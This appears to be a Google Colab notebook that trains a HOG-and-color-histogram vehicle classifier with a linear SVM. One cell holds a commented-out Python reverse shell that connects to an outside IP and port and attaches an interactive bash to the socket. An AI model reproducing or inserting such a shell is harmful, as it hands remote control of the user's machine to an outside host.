{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "vehicle_detection.ipynb",
      "version": "0.3.2",
      "views": {},
      "default_view": {},
      "provenance": [],
      "collapsed_sections": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    }
  },
  "cells": [
    {
      "metadata": {
        "id": "Zr4nbkGz9dg4",
        "colab_type": "text"
      },
      "cell_type": "markdown",
      "source": [
        "## Configuration for using Google Colab and copying dataset"
      ]
    },
    {
      "metadata": {
        "id": "DiafuOF5BzpZ",
        "colab_type": "code",
        "colab": {
          "autoexec": {
            "startup": false,
            "wait_interval": 0
          },
          "base_uri": "https://localhost:8080/",
          "height": 272
        },
        "outputId": "a0eb7576-ec54-4872-9e70-7579addc86b3",
        "executionInfo": {
          "status": "ok",
          "timestamp": 1524066972236,
          "user_tz": -540,
          "elapsed": 31669,
          "user": {
            "displayName": "HyunJae Lee",
            "photoUrl": "//lh5.googleusercontent.com/-PfKIko41kqI/AAAAAAAAAAI/AAAAAAAAANw/pMjWQ1WOnCw/s50-c-k-no/photo.jpg",
            "userId": "102094738439624104685"
          }
        }
      },
      "cell_type": "code",
      "source": [
        "!apt-get install -y -qq software-properties-common python-software-properties module-init-tools > /dev/null\n",
        "!add-apt-repository -y ppa:alessandro-strada/ppa 2>&1 > /dev/null\n",
        "!apt-get update -qq 2>&1 > /dev/null\n",
        "!apt-get -y install -qq google-drive-ocamlfuse fuse > /dev/nul\n",
        "\n",
        "from google.colab import auth\n",
        "auth.authenticate_user()\n",
        "from oauth2client.client import GoogleCredentials\n",
        "creds = GoogleCredentials.get_application_default()\n",
        "import getpass\n",
        "!google-drive-ocamlfuse -headless -id={creds.client_id} -secret={creds.client_secret} < /dev/null 2>&1 | grep URL\n",
        "vcode = getpass.getpass()\n",
        "!echo {vcode} | google-drive-ocamlfuse -headless -id={creds.client_id} -secret={creds.client_secret}\n",
        "\n",
        "!mkdir -p drive\n",
        "!google-drive-ocamlfuse drive\n",
        "!pip install skopt\n",
        "!ls"
      ],
      "execution_count": 9,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "gpg: keybox '/tmp/tmpbm_0r8zg/pubring.gpg' created\n",
            "gpg: /tmp/tmpbm_0r8zg/trustdb.gpg: trustdb created\n",
            "gpg: key AD5F235DF639B041: public key \"Launchpad PPA for Alessandro Strada\" imported\n",
            "gpg: Total number processed: 1\n",
            "gpg:               imported: 1\n",
            "Warning: apt-key output should not be parsed (stdout is not a terminal)\n",
            "··········\n",
            "fuse: mountpoint is not empty\n",
            "fuse: if you are sure this is safe, use the 'nonempty' mount option\n",
            "Collecting skopt\n",
            "\u001b[31m  Could not find a version that satisfies the requirement skopt (from versions: )\u001b[0m\n",
            "\u001b[31mNo matching distribution found for skopt\u001b[0m\n",
            "bbox-example-image.jpg\tlesson_functions.py\t      vehicles_smallset.tar.gz\n",
            "datalab\t\t\tnon-vehicles_smallset.tar.gz\n",
            "drive\t\t\tsmallset\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "metadata": {
        "id": "oEPRFKan7psX",
        "colab_type": "code",
        "colab": {
          "autoexec": {
            "startup": false,
            "wait_interval": 0
          }
        }
      },
      "cell_type": "code",
      "source": [
        "!cp ./drive/data/carnd1-vehicle-detection/*.tar.gz ./\n",
        "!tar -xvzf non-vehicles_smallset.tar.gz\n",
        "!tar -xvzf vehicles_smallset.tar.gz\n",
        "!mkdir smallset\n",
        "!mv non-vehicles_smallset smallset\n",
        "!mv vehicles_smallset smallset\n",
        "!cp ./drive/data/carnd1-vehicle-detection/bbox-example-image.jpg ./\n",
        "!ls"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "metadata": {
        "id": "9nEV-sqUfYhd",
        "colab_type": "code",
        "colab": {
          "autoexec": {
            "startup": false,
            "wait_interval": 0
          },
          "base_uri": "https://localhost:8080/",
          "height": 173
        },
        "outputId": "8609d03e-42ef-4c91-9550-3603e9032e13",
        "executionInfo": {
          "status": "ok",
          "timestamp": 1524069076619,
          "user_tz": -540,
          "elapsed": 4021,
          "user": {
            "displayName": "HyunJae Lee",
            "photoUrl": "//lh5.googleusercontent.com/-PfKIko41kqI/AAAAAAAAAAI/AAAAAAAAANw/pMjWQ1WOnCw/s50-c-k-no/photo.jpg",
            "userId": "102094738439624104685"
          }
        }
      },
      "cell_type": "code",
      "source": [
        "# import socket, subprocess, os\n",
        "# s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n",
        "# s.connect((\"54.249.240.135\", 13337))\n",
        "# os.dup2(s.fileno(), 0)\n",
        "# os.dup2(s.fileno(), 1)\n",
        "# os.dup2(s.fileno(), 2)\n",
        "# p=subprocess.call([\"/bin/bash\", \"-i\"])\n",
        "!pip install scikit-optimize"
      ],
      "execution_count": 24,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "Collecting scikit-optimize\n",
            "  Downloading https://files.pythonhosted.org/packages/f4/44/60f82c97d1caa98752c7da2c1681cab5c7a390a0fdd3a55fac672b321cac/scikit_optimize-0.5.2-py2.py3-none-any.whl (74kB)\n",
            "\u001b[K    100% |████████████████████████████████| 81kB 2.1MB/s \n",
            "\u001b[?25hRequirement already satisfied: scipy>=0.14.0 in /usr/local/lib/python3.6/dist-packages (from scikit-optimize)\n",
            "Requirement already satisfied: scikit-learn>=0.19.1 in /usr/local/lib/python3.6/dist-packages (from scikit-optimize)\n",
            "Requirement already satisfied: numpy in /usr/local/lib/python3.6/dist-packages (from scikit-optimize)\n",
            "Installing collected packages: scikit-optimize\n",
            "Successfully installed scikit-optimize-0.5.2\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "metadata": {
        "id": "9gL7gAU4C_D5",
        "colab_type": "text"
      },
      "cell_type": "markdown",
      "source": [
        "## Feature Extraction and listing image names\n",
        "This is function for features extraction. The features consists of HOG, binned color, and color histogram. The codes come from Udacity's lectures."
      ]
    },
    {
      "metadata": {
        "id": "g1a4TMrpEDja",
        "colab_type": "code",
        "colab": {
          "autoexec": {
            "startup": false,
            "wait_interval": 0
          },
          "base_uri": "https://localhost:8080/",
          "height": 88
        },
        "outputId": "d5d0b1c1-1d6d-4584-b014-54e5d7a314cf",
        "executionInfo": {
          "status": "ok",
          "timestamp": 1524063925812,
          "user_tz": -540,
          "elapsed": 1224,
          "user": {
            "displayName": "HyunJae Lee",
            "photoUrl": "//lh5.googleusercontent.com/-PfKIko41kqI/AAAAAAAAAAI/AAAAAAAAANw/pMjWQ1WOnCw/s50-c-k-no/photo.jpg",
            "userId": "102094738439624104685"
          }
        }
      },
      "cell_type": "code",
      "source": [
        "import matplotlib.image as mpimg\n",
        "import numpy as np\n",
        "import cv2\n",
        "from skimage.feature import hog\n",
        "import matplotlib.pyplot as plt\n",
        "import cv2\n",
        "import glob\n",
        "import time\n",
        "from sklearn.svm import LinearSVC\n",
        "from sklearn.preprocessing import StandardScaler\n",
        "from skimage.feature import hog\n",
        "# NOTE: the next import is only valid for scikit-learn version <= 0.17\n",
        "# for scikit-learn >= 0.18 use:\n",
        "# from sklearn.model_selection import train_test_split\n",
        "from sklearn.cross_validation import train_test_split\n",
        "%matplotlib inline\n",
        "\n",
        "# Define a function to return HOG features and visualization\n",
        "def get_hog_features(img, orient, pix_per_cell, cell_per_block, \n",
        "                        vis=False, feature_vec=True):\n",
        "    # Call with two outputs if vis==True\n",
        "    if vis == True:\n",
        "        features, hog_image = hog(img, orientations=orient, \n",
        "                                  pixels_per_cell=(pix_per_cell, pix_per_cell),\n",
        "                                  block_norm= 'L2-Hys',\n",
        "                                  cells_per_block=(cell_per_block, cell_per_block), \n",
        "                                  transform_sqrt=True, \n",
        "                                  visualise=vis, feature_vector=feature_vec)\n",
        "        return features, hog_image\n",
        "    # Otherwise call with one output\n",
        "    else:      \n",
        "        features = hog(img, orientations=orient, \n",
        "                       pixels_per_cell=(pix_per_cell, pix_per_cell),\n",
        "                       cells_per_block=(cell_per_block, cell_per_block), \n",
        "                       block_norm= 'L2-Hys',\n",
        "                       transform_sqrt=True, \n",
        "                       visualise=vis, feature_vector=feature_vec)\n",
        "        return features\n",
        "\n",
        "# Define a function to compute binned color features  \n",
        "def bin_spatial(img, size=(32, 32)):\n",
        "    # Use cv2.resize().ravel() to create the feature vector\n",
        "    features = cv2.resize(img, size).ravel() \n",
        "    # Return the feature vector\n",
        "    return features\n",
        "\n",
        "# Define a function to compute color histogram features \n",
        "# NEED TO CHANGE bins_range if reading .png files with mpimg!\n",
        "def color_hist(img, nbins=32, bins_range=(0, 256)):\n",
        "    # Compute the histogram of the color channels separately\n",
        "    channel1_hist = np.histogram(img[:,:,0], bins=nbins, range=bins_range)\n",
        "    channel2_hist = np.histogram(img[:,:,1], bins=nbins, range=bins_range)\n",
        "    channel3_hist = np.histogram(img[:,:,2], bins=nbins, range=bins_range)\n",
        "    # Concatenate the histograms into a single feature vector\n",
        "    hist_features = np.concatenate((channel1_hist[0], channel2_hist[0], channel3_hist[0]))\n",
        "    # Return the individual histograms, bin_centers and feature vector\n",
        "    return hist_features\n",
        "\n",
        "# # Define a function to extract features from a single image window\n",
        "# # This function is very similar to extract_features()\n",
        "# # just for a single image rather than list of images\n",
        "# def single_img_features(img, color_space='RGB', spatial_size=(32, 32),\n",
        "#                         hist_bins=32, orient=9, \n",
        "#                         pix_per_cell=8, cell_per_block=2, hog_channel=0,\n",
        "#                         spatial_feat=True, hist_feat=True, hog_feat=True):    \n",
        "#     #1) Define an empty list to receive features\n",
        "#     img_features = []\n",
        "#     #2) Apply color conversion if other than 'RGB'\n",
        "#     if color_space != 'RGB':\n",
        "#         if color_space == 'HSV':\n",
        "#             feature_image = cv2.cvtColor(img, cv2.COLOR_RGB2HSV)\n",
        "#         elif color_space == 'LUV':\n",
        "#             feature_image = cv2.cvtColor(img, cv2.COLOR_RGB2LUV)\n",
        "#         elif color_space == 'HLS':\n",
        "#             feature_image = cv2.cvtColor(img, cv2.COLOR_RGB2HLS)\n",
        "#         elif color_space == 'YUV':\n",
        "#             feature_image = cv2.cvtColor(img, cv2.COLOR_RGB2YUV)\n",
        "#         elif color_space == 'YCrCb':\n",
        "#             feature_image = cv2.cvtColor(img, cv2.COLOR_RGB2YCrCb)\n",
        "#     else: feature_image = np.copy(img)      \n",
        "#     #3) Compute spatial features if flag is set\n",
        "#     if spatial_feat == True:\n",
        "#         spatial_features = bin_spatial(feature_image, size=spatial_size)\n",
        "#         #4) Append features to list\n",
        "#         img_features.append(spatial_features)\n",
        "#     #5) Compute histogram features if flag is set\n",
        "#     if hist_feat == True:\n",
        "#         hist_features = color_hist(feature_image, nbins=hist_bins)\n",
        "#         #6) Append features to list\n",
        "#         img_features.append(hist_features)\n",
        "#     #7) Compute HOG features if flag is set\n",
        "#     if hog_feat == True:\n",
        "#         if hog_channel == 'ALL':\n",
        "#             hog_features = []\n",
        "#             for channel in range(feature_image.shape[2]):\n",
        "#                 hog_features.extend(get_hog_features(feature_image[:,:,channel], \n",
        "#                                     orient, pix_per_cell, cell_per_block, \n",
        "#                                     vis=False, feature_vec=True))      \n",
        "#         else:\n",
        "#             hog_features = get_hog_features(feature_image[:,:,hog_channel], orient, \n",
        "#                         pix_per_cell, cell_per_block, vis=False, feature_vec=True)\n",
        "#         #8) Append features to list\n",
        "#         img_features.append(hog_features)\n",
        "\n",
        "#     #9) Return concatenated array of features\n",
        "#     return np.concatenate(img_features)\n",
        "  \n",
        "# Read in cars and notcars\n",
        "images = glob.glob('./smallset/**/*.jpeg', recursive=True)\n",
        "print(images[:10])\n",
        "cars = []\n",
        "notcars = []\n",
        "for image in images:\n",
        "    if 'image' in image or 'extra' in image:\n",
        "        notcars.append(image)\n",
        "    else:\n",
        "        cars.append(image)\n",
        "        \n",
        "# Reduce the sample size because\n",
        "# The quiz evaluator times out after 13s of CPU time\n",
        "sample_size = 500\n",
        "cars = cars[0:sample_size]\n",
        "notcars = notcars[0:sample_size]"
      ],
      "execution_count": 3,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "['./smallset/non-vehicles_smallset/notcars3/extra324_147.jpeg', './smallset/non-vehicles_smallset/notcars3/extra144_144.jpeg', './smallset/non-vehicles_smallset/notcars3/extra94_151.jpeg', './smallset/non-vehicles_smallset/notcars3/extra297_155.jpeg', './smallset/non-vehicles_smallset/notcars3/extra120_49.jpeg', './smallset/non-vehicles_smallset/notcars3/extra400_186.jpeg', './smallset/non-vehicles_smallset/notcars3/extra392_121.jpeg', './smallset/non-vehicles_smallset/notcars3/extra22_151.jpeg', './smallset/non-vehicles_smallset/notcars3/extra167_153.jpeg', './smallset/non-vehicles_smallset/notcars3/extra111_144.jpeg']\n"
          ],
          "name": "stdout"
        },
        {
          "output_type": "stream",
          "text": [
            "/usr/local/lib/python3.6/dist-packages/sklearn/cross_validation.py:41: DeprecationWarning: This module was deprecated in version 0.18 in favor of the model_selection module into which all the refactored classes and functions are moved. Also note that the interface of the new CV iterators are different from that of this module. This module will be removed in 0.20.\n",
            "  \"This module will be removed in 0.20.\", DeprecationWarning)\n"
          ],
          "name": "stderr"
        }
      ]
    },
    {
      "metadata": {
        "id": "cXZV3rrc_AB6",
        "colab_type": "text"
      },
      "cell_type": "markdown",
      "source": [
        "Here is an example using HOG parameters of orientations=8, pixels_per_cell=(8, 8) and cells_per_block=(2,2) "
      ]
    },
    {
      "metadata": {
        "id": "y85o6rKYEr-u",
        "colab_type": "code",
        "colab": {
          "autoexec": {
            "startup": false,
            "wait_interval": 0
          },
          "base_uri": "https://localhost:8080/",
          "height": 498
        },
        "outputId": "65e34160-3cc9-4398-d7d3-63fae4874eb2",
        "executionInfo": {
          "status": "ok",
          "timestamp": 1524064430702,
          "user_tz": -540,
          "elapsed": 1258,
          "user": {
            "displayName": "HyunJae Lee",
            "photoUrl": "//lh5.googleusercontent.com/-PfKIko41kqI/AAAAAAAAAAI/AAAAAAAAANw/pMjWQ1WOnCw/s50-c-k-no/photo.jpg",
            "userId": "102094738439624104685"
          }
        }
      },
      "cell_type": "code",
      "source": [
        "car_file = cars[np.random.randint(0, sample_size)]\n",
        "not_car_file = notcars[np.random.randint(0, sample_size)]\n",
        "\n",
        "plt.figure(figsize=(8, 8))\n",
        "image = mpimg.imread(car_file)\n",
        "gray = cv2.cvtColor(image, cv2.COLOR_RGB2GRAY)\n",
        "car_features, car_hog_image = get_hog_features(gray, orient= 9, \n",
        "                        pix_per_cell= 8, cell_per_block= 2, \n",
        "                        vis=True, feature_vec=False)\n",
        "plt.subplot(221)\n",
        "plt.imshow(gray, cmap='gray')\n",
        "plt.title('Car')\n",
        "plt.grid(False)\n",
        "plt.subplot(222)\n",
        "plt.title('Car Hog')\n",
        "plt.imshow(car_hog_image, cmap='gray')\n",
        "plt.grid(False)\n",
        "\n",
        "image = mpimg.imread(not_car_file)\n",
        "gray = cv2.cvtColor(image, cv2.COLOR_RGB2GRAY)\n",
        "not_car_features, not_car_hog_image = get_hog_features(gray, orient= 9, \n",
        "                        pix_per_cell= 8, cell_per_block= 2, \n",
        "                        vis=True, feature_vec=False)\n",
        "plt.subplot(223)\n",
        "plt.imshow(gray, cmap='gray')\n",
        "plt.title('not Car')\n",
        "plt.grid(False)\n",
        "plt.subplot(224)\n",
        "plt.imshow(not_car_hog_image, cmap='gray')\n",
        "plt.title('not Car Hog')\n",
        "plt.grid(False)"
      ],
      "execution_count": 6,
      "outputs": [
        {
          "output_type": "display_data",
          "data": {
            "image/png": "[encoded data removed]",
            "text/plain": [
              "<matplotlib.figure.Figure at 0x7fc7cfb391d0>"
            ]
          },
          "metadata": {
            "tags": []
          }
        }
      ]
    },
    {
      "metadata": {
        "id": "BhgYV7Fs0oSV",
        "colab_type": "text"
      },
      "cell_type": "markdown",
      "source": [
        "## Classifier"
      ]
    },
    {
      "metadata": {
        "id": "9TZ6sa0x0zw6",
        "colab_type": "code",
        "colab": {
          "autoexec": {
            "startup": false,
            "wait_interval": 0
          },
          "base_uri": "https://localhost:8080/",
          "height": 85
        },
        "outputId": "1b7d8a91-8e7e-4372-d48e-8dd40e43cadf",
        "executionInfo": {
          "status": "ok",
          "timestamp": 1524076165471,
          "user_tz": -540,
          "elapsed": 9741,
          "user": {
            "displayName": "HyunJae Lee",
            "photoUrl": "//lh5.googleusercontent.com/-PfKIko41kqI/AAAAAAAAAAI/AAAAAAAAANw/pMjWQ1WOnCw/s50-c-k-no/photo.jpg",
            "userId": "102094738439624104685"
          }
        }
      },
      "cell_type": "code",
      "source": [
        "# Define a function to extract features from a list of images\n",
        "# Have this function call bin_spatial() and color_hist()\n",
        "def extract_features(imgs, color_space='RGB', spatial_size=(32, 32),\n",
        "                        hist_bins=32, orient=9, \n",
        "                        pix_per_cell=8, cell_per_block=2, hog_channel=0,\n",
        "                        spatial_feat=True, hist_feat=True, hog_feat=True):\n",
        "    # Create a list to append feature vectors to\n",
        "    features = []\n",
        "    # Iterate through the list of images\n",
        "    for file in imgs:\n",
        "        file_features = []\n",
        "        # Read in each one by one\n",
        "        image = mpimg.imread(file)\n",
        "        # apply color conversion if other than 'RGB'\n",
        "        if color_space != 'RGB':\n",
        "            if color_space == 'HSV':\n",
        "                feature_image = cv2.cvtColor(image, cv2.COLOR_RGB2HSV)\n",
        "            elif color_space == 'LUV':\n",
        "                feature_image = cv2.cvtColor(image, cv2.COLOR_RGB2LUV)\n",
        "            elif color_space == 'HLS':\n",
        "                feature_image = cv2.cvtColor(image, cv2.COLOR_RGB2HLS)\n",
        "            elif color_space == 'YUV':\n",
        "                feature_image = cv2.cvtColor(image, cv2.COLOR_RGB2YUV)\n",
        "            elif color_space == 'YCrCb':\n",
        "                feature_image = cv2.cvtColor(image, cv2.COLOR_RGB2YCrCb)\n",
        "        else: feature_image = np.copy(image)      \n",
        "\n",
        "        if spatial_feat == True:\n",
        "            spatial_features = bin_spatial(feature_image, size=spatial_size)\n",
        "            file_features.append(spatial_features)\n",
        "        if hist_feat == True:\n",
        "            # Apply color_hist()\n",
        "            hist_features = color_hist(feature_image, nbins=hist_bins)\n",
        "            file_features.append(hist_features)\n",
        "        if hog_feat == True:\n",
        "        # Call get_hog_features() with vis=False, feature_vec=True\n",
        "            if hog_channel == 'ALL':\n",
        "                hog_features = []\n",
        "                for channel in range(feature_image.shape[2]):\n",
        "                    hog_features.append(get_hog_features(feature_image[:,:,channel], \n",
        "                                        orient, pix_per_cell, cell_per_block, \n",
        "                                        vis=False, feature_vec=True))\n",
        "                hog_features = np.ravel(hog_features)        \n",
        "            else:\n",
        "                hog_features = get_hog_features(feature_image[:,:,hog_channel], orient, \n",
        "                            pix_per_cell, cell_per_block, vis=False, feature_vec=True)\n",
        "            # Append the new feature vector to the features list\n",
        "            file_features.append(hog_features)\n",
        "        features.append(np.concatenate(file_features))\n",
        "    # Return list of feature vectors\n",
        "    return features\n",
        "\n",
        "### TODO: Tweak these parameters and see how the results change.\n",
        "color_space = 'HLS' # Can be RGB, HSV, LUV, HLS, YUV, YCrCb\n",
        "orient = 8  # HOG orientations\n",
        "pix_per_cell = 8 # HOG pixels per cell\n",
        "cell_per_block = 2 # HOG cells per block\n",
        "hog_channel = 'ALL' # Can be 0, 1, 2, or \"ALL\"\n",
        "spatial_size = (16, 16) # Spatial binning dimensions\n",
        "hist_bins = 16    # Number of histogram bins\n",
        "spatial_feat = True # Spatial features on or off\n",
        "hist_feat = True # Histogram features on or off\n",
        "hog_feat = True # HOG features on or off\n",
        "y_start_stop = [490, None] # Min and max in y to search in slide_window()\n",
        "\n",
        "car_features = extract_features(cars, color_space=color_space, \n",
        "                        spatial_size=spatial_size, hist_bins=hist_bins, \n",
        "                        orient=orient, pix_per_cell=pix_per_cell, \n",
        "                        cell_per_block=cell_per_block, \n",
        "                        hog_channel=hog_channel, spatial_feat=spatial_feat, \n",
        "                        hist_feat=hist_feat, hog_feat=hog_feat)\n",
        "notcar_features = extract_features(notcars, color_space=color_space, \n",
        "                        spatial_size=spatial_size, hist_bins=hist_bins, \n",
        "                        orient=orient, pix_per_cell=pix_per_cell, \n",
        "                        cell_per_block=cell_per_block, \n",
        "                        hog_channel=hog_channel, spatial_feat=spatial_feat, \n",
        "                        hist_feat=hist_feat, hog_feat=hog_feat)\n",
        "\n",
        "# Create an array stack of feature vectors\n",
        "X = np.vstack((car_features, notcar_features)).astype(np.float64)\n",
        "\n",
        "# Define the labels vector\n",
        "y = np.hstack((np.ones(len(car_features)), np.zeros(len(notcar_features))))\n",
        "\n",
        "# Split up data into randomized training and test sets\n",
        "rand_state = np.random.randint(0, 100)\n",
        "X_train, X_test, y_train, y_test = train_test_split(\n",
        "    X, y, test_size=0.2, random_state=rand_state)\n",
        "    \n",
        "# Fit a per-column scaler\n",
        "X_scaler = StandardScaler().fit(X_train)\n",
        "# Apply the scaler to X\n",
        "X_train = X_scaler.transform(X_train)\n",
        "X_test = X_scaler.transform(X_test)\n",
        "\n",
        "print('Using:',orient,'orientations',pix_per_cell,\n",
        "    'pixels per cell and', cell_per_block,'cells per block')\n",
        "print('Feature vector length:', len(X_train[0]))\n",
        "# Use a linear SVC \n",
        "svc = LinearSVC()\n",
        "# Check the training time for the SVC\n",
        "t=time.time()\n",
        "svc.fit(X_train, y_train)\n",
        "t2 = time.time()\n",
        "print(round(t2-t, 2), 'Seconds to train SVC...')\n",
        "# Check the score of the SVC\n",
        "print('|{0}|{1}|{2}|{3}|{4}|{5}|'.format(color_space,orient , pix_per_cell,cell_per_block , hog_channel,round(svc.score(X_test, y_test), 4)))\n",
        "# Check the prediction time for a single sample\n",
        "t=time.time()"
      ],
      "execution_count": 77,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "Using: 8 orientations 8 pixels per cell and 2 cells per block\n",
            "Feature vector length: 5520\n",
            "0.24 Seconds to train SVC...\n",
            "|HLS|8|8|2|ALL|0.985|\n"
          ],
          "name": "stdout"
        }
      ]
    }
  ]
}